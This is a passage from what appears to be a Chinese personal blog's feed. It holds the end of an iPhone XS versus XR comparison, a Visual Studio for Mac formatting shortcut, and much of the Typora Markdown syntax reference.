&lt;p&gt;XS 的续航嘛&amp;hellip;&lt;/p&gt;
&lt;p&gt;不用说了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;续航：XS &amp;lt; XR&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;性能&#34;&gt;性能&lt;/h1&gt;
&lt;p&gt;似乎我不是很关注手机的性能毕竟不太用手机玩游戏的&lt;/p&gt;
&lt;p&gt;但是觉得这也很有必要放进考虑里&lt;/p&gt;
&lt;p&gt;XS 的内存是 4GB，XR 与 X 一样是 3GB&lt;/p&gt;
&lt;p&gt;其实反正是墓碑后台所以估计在未来两年内（瞎猜的）除了 XR 可能偶尔杀杀后台以外其他地方几乎无区别&lt;/p&gt;
&lt;p&gt;顺便隔壁 SE 二代也是 3GB 内存来着&lt;/p&gt;
&lt;p&gt;话说是哪个啥比起头把闪存也叫做内存的&lt;/p&gt;
&lt;p&gt;现在说个「内存」都不知道在指 RAM 还是闪存kuso&amp;hellip;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;另外两个都是 A12 处理器，但很重要的是，XS 是双层主板&lt;/p&gt;
&lt;p&gt;所以发热很——严重&lt;/p&gt;
&lt;p&gt;那&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;发热严重 → 降频 &amp;amp;&amp;amp; 屏幕亮度降低 → 看起来和摸起来都很不舒服&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;emm实在不知道怎么比&lt;/p&gt;
&lt;p&gt;或许因为我不算重度使用的人所以我还是考虑：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;RAM 更大 → 可以撑更多年&lt;/p&gt;
&lt;p&gt;XS &amp;gt; XR&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;摄影&#34;&gt;摄影&lt;/h1&gt;
&lt;p&gt;原谅我用了「摄影」而不是「拍照」、因为只是觉得前者好听x&lt;/p&gt;
&lt;p&gt;XR 的主摄 和 XS 的其实是一个&lt;/p&gt;
&lt;p&gt;XS 多的那个长焦镜头&amp;hellip;至少它有&lt;/p&gt;
&lt;p&gt;「人像模式」也就是模拟景深的这部分&lt;/p&gt;
&lt;p&gt;XR 虽然可以靠算法识别出人把人给抠出来，&lt;/p&gt;
&lt;p&gt;但是它只能识别人（草&lt;/p&gt;
&lt;p&gt;XS 的话是利用到了那个长焦镜头所以其他一些东西也可以模拟景深（虽然效果并不好&lt;/p&gt;
&lt;p&gt;但是本着有总比没有强x&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;摄像：XR &amp;gt; XS&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;屏幕&#34;&gt;屏幕&lt;/h1&gt;
&lt;p&gt;emm&lt;/p&gt;
&lt;p&gt;其实并不是很不在乎这个&amp;hellip;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;因为用过很长时间的 Windows Phone 所以我个人偏向 OLED 因为黑色舒服&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其实不喜欢 iOS 的深色模式、只是因为我觉得看不清（或许是 6S 的问题&lt;/p&gt;
&lt;p&gt;所以其实 LCD 也无所谓&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不觉得 XR 1792×828 &amp;amp; 326 ppi 的屏幕没法看&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XS 5.8 英寸，XR 6.1 英寸；其实我觉得都可&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;XR 没有 3D Touch，但是我还是挺喜欢的&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;结论&lt;/p&gt;
&lt;p&gt;XS 因为还有 3D Touch 所以 略微 优于 XR&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;杂项&#34;&gt;杂项&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;双卡对我无所谓&lt;/li&gt;
&lt;li&gt;信号似乎 XR 略微好一点&lt;/li&gt;
&lt;li&gt;XR IP67，XS IP68，但我肯定不会闲的无聊往一两米深的水里丢x&lt;/li&gt;
&lt;li&gt;null&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h1 id=&#34;总结&#34;&gt;总结&lt;/h1&gt;
&lt;p&gt;没想好&amp;hellip;&lt;/p&gt;
&lt;p&gt;或许对我来说 XS..?&lt;/p&gt;
&lt;p&gt;再不行我就抛个硬币让命运石之门帮我决定得了ww&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Visual Studio Mac 代码格式化快捷键</title>
        <link>/p/mac-vs-code-format/</link>
        <pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>/p/mac-vs-code-format/</guid>
        <description>&lt;p&gt;Control + i&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Lorem ipsum</title>
        <link>/p/markdown-references/</link>
        <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>/p/markdown-references/</guid>
        <description>&lt;h1 id=&#34;markdown-for-typora&#34;&gt;Markdown For Typora&lt;/h1&gt;
&lt;h2 id=&#34;overview&#34;&gt;Overview&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Markdown&lt;/strong&gt; is created by &lt;a class=&#34;link&#34; href=&#34;http://daringfireball.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Daring Fireball&lt;/a&gt;; the original guideline is &lt;a class=&#34;link&#34; href=&#34;http://daringfireball.net/projects/markdown/syntax&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;. Its syntax, however, varies between different parsers or editors. &lt;strong&gt;Typora&lt;/strong&gt; is using &lt;a class=&#34;link&#34; href=&#34;https://help.github.com/articles/github-flavored-markdown/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub Flavored Markdown&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&#34;block-elements&#34;&gt;Block Elements&lt;/h2&gt;
&lt;h3 id=&#34;paragraph-and-line-breaks&#34;&gt;Paragraph and line breaks&lt;/h3&gt;
&lt;p&gt;A paragraph is simply one or more consecutive lines of text. In markdown source code, paragraphs are separated by two or more blank lines. In Typora, you only need one blank line (press &lt;code&gt;Return&lt;/code&gt; once) to create a new paragraph.&lt;/p&gt;
&lt;p&gt;Press &lt;code&gt;Shift&lt;/code&gt; + &lt;code&gt;Return&lt;/code&gt; to create a single line break. Most other markdown parsers will ignore single line breaks, so in order to make other markdown parsers recognize your line break, you can leave two spaces at the end of the line, or insert &lt;code&gt;&amp;lt;br/&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;headers&#34;&gt;Headers&lt;/h3&gt;
&lt;p&gt;Headers use 1-6 hash (&lt;code&gt;#&lt;/code&gt;) characters at the start of the line, corresponding to header levels 1-6. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# This is an H1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## This is an H2
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;###### This is an H6
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In Typora, input ‘#’s followed by title content, and press &lt;code&gt;Return&lt;/code&gt; key will create a header.&lt;/p&gt;
&lt;h3 id=&#34;blockquotes&#34;&gt;Blockquotes&lt;/h3&gt;
&lt;p&gt;Markdown uses email-style &amp;gt; characters for block quoting. They are presented as:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;This is a blockquote with two paragraphs. This is first paragraph.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&amp;gt; This is second pragraph. Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;font-style:italic&#34;&gt;This is another blockquote with one paragraph. There is three empty line to seperate two blockquote.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In Typora, inputting ‘&amp;gt;’ followed by your quote contents will generate a quote block. Typora will insert a proper ‘&amp;gt;’ or line break for you. Nested block quotes (a block quote inside another block quote) by adding additional levels of ‘&amp;gt;’.&lt;/p&gt;
&lt;h3 id=&#34;lists&#34;&gt;Lists&lt;/h3&gt;
&lt;p&gt;Input &lt;code&gt;* list item 1&lt;/code&gt; will create an unordered list - the &lt;code&gt;*&lt;/code&gt; symbol can be replace with &lt;code&gt;+&lt;/code&gt; or &lt;code&gt;-&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Input &lt;code&gt;1. list item 1&lt;/code&gt; will create an ordered list - their markdown source code is as follows:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## un-ordered list
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;*&lt;/span&gt;   Red
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;*&lt;/span&gt;   Green
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;*&lt;/span&gt;   Blue
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## ordered list
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;1.&lt;/span&gt;  Red
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;2.&lt;/span&gt; 	Green
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3.	Blue
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;task-list&#34;&gt;Task List&lt;/h3&gt;
&lt;p&gt;Task lists are lists with items marked as either [ ] or [x] (incomplete or complete). For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;- [ ]&lt;/span&gt; a task list item
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;- [ ]&lt;/span&gt; list syntax required
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;- [ ]&lt;/span&gt; normal &lt;span style=&#34;font-weight:bold&#34;&gt;**formatting**&lt;/span&gt;, @mentions, #1234 refs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;- [ ]&lt;/span&gt; incomplete
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;- [x]&lt;/span&gt; completed
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can change the complete/incomplete state by clicking on the checkbox before the item.&lt;/p&gt;
&lt;h3 id=&#34;fenced-code-blocks&#34;&gt;(Fenced) Code Blocks&lt;/h3&gt;
&lt;p&gt;Typora only supports fences in GitHub Flavored Markdown. Original code blocks in markdown are not supported.&lt;/p&gt;
&lt;p&gt;Using fences is easy: Input ``` and press &lt;code&gt;return&lt;/code&gt;. Add an optional language identifier after ``` and we&amp;rsquo;ll run it through syntax highlighting:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-gfm&#34; data-lang=&#34;gfm&#34;&gt;Here&amp;#39;s an example:

```js
function test() {
  console.log(&amp;#34;notice the blank line before this function?&amp;#34;);
}
```

syntax highlighting:
```ruby
require &amp;#39;redcarpet&amp;#39;
markdown = Redcarpet.new(&amp;#34;Hello World!&amp;#34;)
puts markdown.to_html
```
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;math-blocks&#34;&gt;Math Blocks&lt;/h3&gt;
&lt;p&gt;You can render &lt;em&gt;LaTeX&lt;/em&gt; mathematical expressions using &lt;strong&gt;MathJax&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;To add a mathematical expression, input &lt;code&gt;$$&lt;/code&gt; and press the &amp;lsquo;Return&amp;rsquo; key. This will trigger an input field which accepts &lt;em&gt;Tex/LaTex&lt;/em&gt; source. For example:&lt;/p&gt;
&lt;p&gt;$$
\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix}
\mathbf{i} &amp;amp; \mathbf{j} &amp;amp; \mathbf{k} \
\frac{\partial X}{\partial u} &amp;amp;  \frac{\partial Y}{\partial u} &amp;amp; 0 \
\frac{\partial X}{\partial v} &amp;amp;  \frac{\partial Y}{\partial v} &amp;amp; 0 \
\end{vmatrix}
$$&lt;/p&gt;
&lt;p&gt;In the markdown source file, the math block is a &lt;em&gt;LaTeX&lt;/em&gt; expression wrapped by a pair of ‘$$’ marks:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$$
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\mathbf{i} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt; \mathbf{j} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt; \mathbf{k} \\
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\frac{\partial X}{\partial u} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt;  \frac{\partial Y}{\partial u} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt; 0 \\
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\frac{\partial X}{\partial v} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt;  \frac{\partial Y}{\partial v} &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;amp;&lt;/span&gt; 0 \\
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;\end{vmatrix}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$$
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can find more details &lt;a class=&#34;link&#34; href=&#34;https://support.typora.io/Math/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;tables&#34;&gt;Tables&lt;/h3&gt;
&lt;p&gt;Input &lt;code&gt;| First Header  | Second Header |&lt;/code&gt; and press the &lt;code&gt;return&lt;/code&gt; key. This will create a table with two columns.&lt;/p&gt;
&lt;p&gt;After a table is created, putting focus on that table will open up a toolbar for the table where you can resize, align, or delete the table. You can also use the context menu to copy and add/delete individual columns/rows.&lt;/p&gt;
&lt;p&gt;The full syntax for tables is described below, but it is not necessary to know the full syntax in detail as the markdown source code for tables is generated automatically by Typora.&lt;/p&gt;
&lt;p&gt;In markdown source code, they look like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| First Header  | Second Header |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ------------- | ------------- |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Content Cell  | Content Cell  |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Content Cell  | Content Cell  |
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can also include inline Markdown such as links, bold, italics, or strikethrough in the table.&lt;/p&gt;
&lt;p&gt;Finally, by including colons (&lt;code&gt;:&lt;/code&gt;) within the header row, you can define text in that column to be left-aligned, right-aligned, or center-aligned:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| Left-Aligned  | Center Aligned  | Right Aligned |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| :------------ |:---------------:| -----:|
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| col 3 is      | some wordy text | $1600 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| col 2 is      | centered        |   $12 |
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| zebra stripes | are neat        |    $1 |
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A colon on the left-most side indicates a left-aligned column; a colon on the right-most side indicates a right-aligned column; a colon on both sides indicates a center-aligned column.&lt;/p&gt;
&lt;h3 id=&#34;footnotes&#34;&gt;Footnotes&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;You can create footnotes like this[^footnote].
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[^footnote]: Here is the &lt;span style=&#34;font-style:italic&#34;&gt;*text*&lt;/span&gt; of the &lt;span style=&#34;font-weight:bold&#34;&gt;**footnote**&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;will produce:&lt;/p&gt;
&lt;p&gt;You can create footnotes like this&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;Hover over the ‘footnote’ superscript to see content of the footnote.&lt;/p&gt;
&lt;h3 id=&#34;horizontal-rules&#34;&gt;Horizontal Rules&lt;/h3&gt;
&lt;p&gt;Inputting &lt;code&gt;***&lt;/code&gt; or &lt;code&gt;---&lt;/code&gt; on a blank line and pressing &lt;code&gt;return&lt;/code&gt; will draw a horizontal line.&lt;/p&gt;
&lt;hr /&gt;
&lt;h3 id=&#34;yaml-front-matter&#34;&gt;YAML Front Matter&lt;/h3&gt;
&lt;p&gt;Typora now supports &lt;a class=&#34;link&#34; href=&#34;http://jekyllrb.com/docs/frontmatter/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;YAML Front Matter&lt;/a&gt;. Input &lt;code&gt;---&lt;/code&gt; at the top of the article and then press &lt;code&gt;Return&lt;/code&gt; to introduce a metadata block. Alternatively, you can insert a metadata block from the top menu of Typora.&lt;/p&gt;
&lt;h3 id=&#34;table-of-contents-toc&#34;&gt;Table of Contents (TOC)&lt;/h3&gt;
&lt;p&gt;Input &lt;code&gt;[toc]&lt;/code&gt; and press the &lt;code&gt;Return&lt;/code&gt; key. This will create a  “Table of Contents” section. The TOC extracts all headers from the document, and its contents are updated automatically as you add to the document.&lt;/p&gt;
&lt;h2 id=&#34;span-elements&#34;&gt;Span Elements&lt;/h2&gt;
&lt;p&gt;Span elements will be parsed and rendered right after typing. Moving the cursor in middle of those span elements will expand those elements into markdown source. Below is an explanation of the syntax for each span element.&lt;/p&gt;
&lt;h3 id=&#34;links&#34;&gt;Links&lt;/h3&gt;
&lt;p&gt;Markdown supports two styles of links: inline and reference.&lt;/p&gt;
&lt;p&gt;In both styles, the link text is delimited by [square brackets].&lt;/p&gt;
&lt;p&gt;To create an inline link, use a set of regular parentheses immediately after the link text’s closing square bracket. Inside the parentheses, put the URL where you want the link to point, along with an optional title for the link, surrounded in quotes. For example:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This is [&lt;span style=&#34;color:#f92672&#34;&gt;an example&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;http://example.com/ &amp;#34;Title&amp;#34;&lt;/span&gt;) inline link.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;This link&lt;/span&gt;](&lt;span style=&#34;color:#a6e22e&#34;&gt;http://example.net/&lt;/span&gt;) has no title attribute.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;will produce:&lt;/p&gt;
&lt;p&gt;This is &lt;a class=&#34;link&#34; href=&#34;http://example.com/&#34;  title=&#34;Title&#34;
     target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;an example&lt;/a&gt; inline link. (&lt;code&gt;&amp;lt;p&amp;gt;This is &amp;lt;a href=&amp;quot;http://example.com/&amp;quot; title=&amp;quot;Title&amp;quot;&amp;gt;&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://example.net/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;This link&lt;/a&gt; has no title attribute. (&lt;code&gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;quot;http://example.net/&amp;quot;&amp;gt;This link&amp;lt;/a&amp;gt; has no&lt;/code&gt;)&lt;/p&gt;
&lt;h4 id=&#34;internal-links&#34;&gt;Internal Links&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;You can set the href to headers&lt;/strong&gt;, which will create a bookmark that allow you to jump to that section after clicking. For example:&lt;/p&gt;
&lt;p&gt;Command(on Windows: Ctrl) + Click &lt;a class=&#34;link&#34; href=&#34;#block-elements&#34; &gt;This link&lt;/a&gt; will jump to header &lt;code&gt;Block Elements&lt;/code&gt;. To see how to write that, please move cursor or click that link with &lt;code&gt;⌘&lt;/code&gt; key pressed to expand the element into markdown source.&lt;/p&gt;
&lt;h4 id=&#34;reference-links&#34;&gt;Reference Links&lt;/h4&gt;
&lt;p&gt;Reference-style links use a second set of square brackets, inside which you place a label of your choosing to identify the link:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;This is [an example][id] reference-style link.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Then, anywhere in the document, you define your link label on a line by itself like this:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[id]: http://example.com/  &amp;#34;Optional Title Here&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In Typora, they will be rendered like so:&lt;/p&gt;
&lt;p&gt;This is &lt;a class=&#34;link&#34; href=&#34;http://example.com/&#34;  title=&#34;Optional Title Here&#34;
     target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;an example&lt;/a&gt; reference-style link.&lt;/p&gt;
&lt;p&gt;The implicit link name shortcut allows you to omit the name of the link, in which case the link text itself is used as the name. Just use an empty set of square brackets — for example, to link the word “Google” to the google.com web site, you could simply write:&lt;/p&gt;
